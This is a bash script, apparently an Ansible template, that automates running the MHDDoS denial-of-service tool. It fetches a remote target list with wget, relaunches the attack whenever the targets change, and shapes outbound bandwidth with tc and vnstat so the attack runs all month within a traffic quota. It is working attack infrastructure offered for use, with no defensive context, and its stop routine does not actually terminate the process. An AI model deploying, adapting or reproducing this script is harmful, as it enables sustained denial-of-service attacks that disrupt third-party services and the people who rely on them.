#!/bin/bash

SRC="{{ dd_local }}"
VRB=0
IFC="{{ iface }}"
LIM="{{ ddos_limit }}"
MIN=100
#UNL=102400
CFG="{{ dd_config }}"
LFG="/tmp/targets.txt"
LFM=
THR="{{ dd_threads }}"
SLP="{{ ddos_sleep }}"
LOG="{{ ddos_log }}"
LGM="{{ dd_log }}"
SBJ="$(basename $0) Failure"
PID=
DRY=0
SUDO=

help() {
    cat <<EOF
Usage: $(basename $0) [options]
 -R - reset limit
 -V - show actual limit
 -l limit (${LIM}GB)
 -m min - minimal limit (${MIN}k/s)
 -n - don't limit
 -s sleep ($SLP)
 -t threads ($THR)
 -L log ($LOG)
 -M MHDDOS log ($LGM)
 -q
 -v
 -h
EOF
    exit
}

die() {
    echo $* 1>&2
    [ -n "$LOG" ] && echo $* >> "$LOG"
    [ $VRB -eq 0 ] && which mail >/dev/null && echo $* | mail -s "$SBJ" $USER
}

out() {
    [ $VRB -gt 0 ] && echo $*
    [ -n "$LOG" ] && echo $(date '+%Y-%m-%d %H:%M:%S') $* >> "$LOG"
}

check_limit() {
    TRF=$(vnstat -i $IFC --json m 1 | jq ".interfaces[] | select(.name == \"$IFC\") | .traffic.month[0].tx")
    [ -n "$TRF" ] || die "Failed to get traffic value: $TRF"
    [ $VRB -gt 0 ] && out "Traffic $(numfmt --to=iec $TRF) vs $LIM"
    [ $TRF -ge $LMV ] && return 1
    return 0
}

reset_limit() {
    out "Reseting all limits.."
    [ $DRY -eq 0 ] && $SUDO tc qdisc del dev $IFC root
    #[ $DRY -eq 0 ] && $SUDO wondershaper clear $IFC
}

show_limit() {
    echo "Actual limit values:"
    $SUDO tc -s qdisc ls dev $IFC
    #$SUDO wondershaper $IFC
}

update_limit() {
    TRF=$(vnstat -i $IFC --json m 1 | jq ".interfaces[] | select(.name == \"$IFC\") | .traffic.month[0].tx")
    [ -n "$TRF" ] || (cleanup; die "Failed to get traffic value: $TRF")
    #out "Traffic $(numfmt --to=iec $TRF) vs $LIM"
    LDM=$(date -d "-$(date '+%d') days  month" '+%d' | sed 's/^0//')
    TOD=$(date '+%d' | sed 's/^0//')
    DAYS=$(($LDM - $TOD + 1))
    out "Days left in this month: $DAYS"
    TRL=$(( ($LMV-$TRF)/1024/($LDM-$TOD+1)/86400*8 ))
    [ $TRL -lt $MIN ] && out "Adjusting limit $TRL up to $MIN"
    #PKL=$(( $TRL * 3 / 2 ))
    #out "New limit: ${TRL}k/s, peak: ${PKL}k/s"
    out "New limit: ${TRL}k/s"
    #[ $DRY -eq 0 ] && $SUDO wondershaper $IFC $UNL $TRL
    [ $DRY -eq 0 ] && $SUDO tc qdisc del dev $IFC root
    [ $DRY -eq 0 ] && $SUDO tc qdisc add dev $IFC root tbf rate ${TRL}kbit burst 16kbit latency 1ms
}

run_mhdd() {
    if [ -z "$PID" ]; then
        XFG=$CFG
        [ -f "$LFG" ] && XFG=$LFG
        out "Launching MHDDOS proxy: {{ dd_cmd }} $THR -c $XFG, log file $LGM"
        {{ dd_cmd }} $THR -c $XFG >> "$LGM" 2>&1 &
        PID=$!
    fi
}

stop_mhdd() {
    if [ -n "$PID" ]; then
        out "Stopping MHDDOS proxy"
        kill -0 $PID
        PID=
    fi
}

check_cfg() {
    TFG="$LFG.$$"
    out "Downloading $CFG"
    wget -q -O "$TFG" "$CFG"
    [ -f "$TFG" ] || die "Unable to download targets: $CFG -> $TFG"
    if [ ! -f "$LFG" ]; then
        mv "$TFG" "$LFG"
        return 1
    elif ! diff -q "$TFG" "$LFG"; then
        out "Local file is different ($LFG)"
        mv "$TFG" "$LFG"
        return 1
    fi
    rm -f "$TFG"
    return 0
}

cleanup() {
    reset_limit
    rm -f "$LFG"
    kill 0
}

tty -s && VRB=1
while getopts ":qvhc:l:L:m:M:ns:RV" opt; do
    case $opt in
        R) reset_limit; exit ;;
        V) show_limit;  exit ;;
        l) LIM=$OPTARG ;;
        L) LOG=$OPTARG ;;
        m) MIN=$OPTARG ;;
        M) LGM=$OPTARG ;;
        n) DRY=1 ;;
        s) SLP=$OPTARG ;;
        t) THR=$OPTARG ;;
        v) VRB=1 ;;
        q) VRB=0 ;;
        h) help  ;;
        *) help  ;;
    esac
done
shift $((OPTIND - 1))

which vnstat >/dev/null || die "vnstat not found!"
which numfmt >/dev/null || die "numfmt not found!"
#which wondershaper >/dev/null || die "wondershaper not found!"
which tc >/dev/null     || die "tc not found!"
which wget >/dev/null   || die "wget not found!"
which diff >/dev/null   || die "diff not found!"
which jq >/dev/null     || die "jq not found!"

[ $(id -u) -eq 0 ] || SUDO=sudo

LMV=$(numfmt --from=iec $LIM)
[ -n "$LMV" ] || die "Invalid limit value: $LMV"
[ "$THR" = "0" ] && THR=
[ -n "$THR" ] && THR="-t $THR"

trap "exit" INT TERM ERR
trap "cleanup" EXIT

cd "$SRC"

while true; do
    if check_limit; then
        update_limit
        check_cfg || stop_mhdd
        run_mhdd
    else
        stop_mhdd
        reset_limit
    fi
    sleep $SLP
done
